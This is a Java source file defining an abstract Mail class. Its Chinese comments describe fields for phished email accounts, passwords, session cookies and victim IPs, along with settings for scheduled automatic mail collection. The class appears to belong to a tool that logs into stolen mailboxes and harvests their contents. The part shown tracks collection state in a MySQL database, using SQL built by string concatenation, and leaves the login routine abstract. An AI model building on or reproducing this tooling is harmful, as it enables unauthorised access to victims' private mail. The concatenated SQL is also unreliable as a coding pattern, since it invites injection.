/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

package email;



import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.text.DateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;

/**
 *
 * @author root
 */
public abstract class Mail {

        public int mailTotalCounts=0;

        public int m_ID;							//唯一标示，主键
	public String m_accounts;   			//用户输入的邮箱帐户以及钓到的邮箱账户
	public String m_password;   			//用户输入的邮箱密码以及钓到的邮箱密码
        public String m_postfix;
	public String m_userMessage;			//用户备注
	public String m_logo; 			        //用户收取邮箱的标示
	public String m_Power;       		    //属主
	public int m_Pages;                  		//按页收取字段
	public String m_FirstTime; 		        //上次收取时间
	public String m_LastTime;	            //最后一次收取时间
	public String m_MailType; 	            //邮箱类型
	public int m_MailNumber;			        //已经接收的邮件数量
	public String m_IP;  		            //钓到的IP
	public String m_AddTime; 	                //钓到的COOKIE及密码的时间
	public int m_AutoRev;			   		    //是否自动收取
	public String m_TimeSpace;                  //间隔收取时间
	public String m_DateRevLimit;           //按时间收取
	public int m_RevLogo;		 	            //收取次数状态标示
	public int m_RevState; 				    //接收状态
        public String m_cookie;                                                     //cookie信息                                                        //ip
        public String m_browser;
        public String m_url;
        public MailFuncInter m_mailInter;
	public void start()
	{
		int receiveState =1;
		Date now = new Date(System.currentTimeMillis());
                DateFormat date = DateFormat.getDateTimeInstance();
                String Date = date.format(now);

		String sql="";
		try
		{
                    this.connectdb();
                    if(m_cookie!=null)
                    {
                        sql="update  emailcookies set RevState='"+receiveState+"' where ID='"+m_ID+"'";
                    }
                    else
                    {
                        sql="update  emailaccounts set RevState='"+receiveState+"' where ID='"+m_ID+"'";
                    }
                    this.ExcuteSql(sql);				//更新账号接收状态及接收时间
                     login();
                    receiveState = 0;
                    if(m_cookie!=null)
                    {
                        sql="update  emailcookies set RevState='"+receiveState+"'"+" where ID='"+m_ID+"'";
                    }
                    else
                    {
                        sql="update  emailaccounts set RevState='"+receiveState+"'"+","+"MailNumber='"+mailTotalCounts+"'"+","+"LastTime='"+Date+"' where ID='"+m_ID+"'";
                    }
                     this.ExcuteSql(sql);
		}
		catch(Exception err)
		{
			err.printStackTrace();
		}
		finally
		{
                    receiveState = 0;
                    if(m_cookie!=null)
                    {
                        sql="update  emailcookies set RevState='"+receiveState+"'"+" where ID='"+m_ID+"'";
                    }
                    else
                    {
                        sql="update  emailaccounts set RevState='"+receiveState+"'"+","+"MailNumber='"+mailTotalCounts+"'"+","+"LastTime='"+Date+"' where ID='"+m_ID+"'";
                    }
                     this.ExcuteSql(sql);
                     this.disconnectdb();

                    // m_mailInter.RefashTable();
                     
		}
	}
	abstract void login();
    private Statement stmt;
    private ResultSet result;
    private Connection con;
    static String userName=null;                                                 //mysql数据库所在主机用户名
    static String passWord=null;                                                //密码
    static String dburl=null;                             //连接到mysql数据库
    private void connectdb()
    {
	//int totalCount=0;
        if(userName==null)
        {
            ReadDbConf();
        }
	try
	{
		Class.forName("com.mysql.jdbc.Driver");                         //.newInstance();	//创建类
		con=DriverManager.getConnection(dburl,userName,passWord)  ;       //创建连接
		stmt=con.createStatement();
		//result=stmt.executeQuery("select * from user");
		//result.last();
		//totalCount=result.getRow();
		//System.out.print(totalCount);


	}
	catch (ClassNotFoundException e)
	{
		// TODO Auto-generated catch block
		//jTextInfo.setText("加载JDBC驱动程序失败！\n");
		e.printStackTrace();

	} catch (SQLException e)
	{
		// TODO Auto-generated catch block
		e.printStackTrace();
		//jTextInfo.setText("连接数据库失败！\n");

	}
    }
    private void disconnectdb()
    {
        if(con != null)
	{
            try
	{
		con.close();
		stmt.close();
		//result.close();
	}
	catch(Exception e)
	{
		e.printStackTrace();
	}
		con = null;
	}
    }
    private int ExcuteSql(String sql)
    {
        int count=-1;
        try
	{
		count=stmt.executeUpdate(sql);
//                result.last();
//                if(result.next())
//                {
//                    count=result.getInt(1);
//                }
              //  count=result.getRow();

	}
	catch (SQLException e)
	{
		// TODO Auto-generated catch block
		e.printStackTrace();
	}

        return count;
    }
    private void ReadDbConf() {

        //读取数据苦配置文件
        try
        {
            File directory=new File(".");
            String filepath="/database.conf";
            File file = new File(directory.getCanonicalPath() + filepath);
            if (file.exists())
            {
	    	BufferedReader reader=new BufferedReader(new FileReader(file));
                String strTemp = null;
                int line = 1;
                //按行读取文件，直到读入null为文件结束
                while ((strTemp = reader.readLine()) != null)
                {
                    if(line==1)
                    {
                        userName=putstr(strTemp,"user: ",";",0).trim();
                    }
                    if(line==2)
                    {
                        passWord=putstr(strTemp,"password: ",";",0).trim();
                    }
                    if(line==3)
                    {
                        dburl=putstr(strTemp,"url: ",";",0).trim();
                    }
                    line++;
                }
                reader.close();
            }
	    else
            {
                JOptionPane.showMessageDialog(null, "database.conf 配置文件不存在！");
               // return;
            }
        }
        catch (IOException ex)
        {
            Logger.getLogger(EmailView.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
        /**
        *
	 * @param message 字符串
	 * @param startStr 起始字符
	 * @param endStr 末尾字符Hotmail
	 * @param startIndex 字符串起始位置
	 * @return 两个字符串之间的数据
	 */
	public String putstr(String message, String startStr, String endStr,int startIndex) // 取两个字符串之间的数据
	{
		if (startIndex < 0)
			return "-1";
		if (message.length() < startIndex)
			return "-1";
		String subStr = message.substring(startIndex, message.length());
		int indexStar = subStr.indexOf(startStr);
		if (indexStar < 0)
			return "-1";
		indexStar += startStr.length();
		subStr = subStr.substring(indexStar, subStr.length());
		int indexEnd = subStr.indexOf(endStr);
		if (indexEnd < 0)
			return "-1";
		return subStr.substring(0, indexEnd);
	}
}


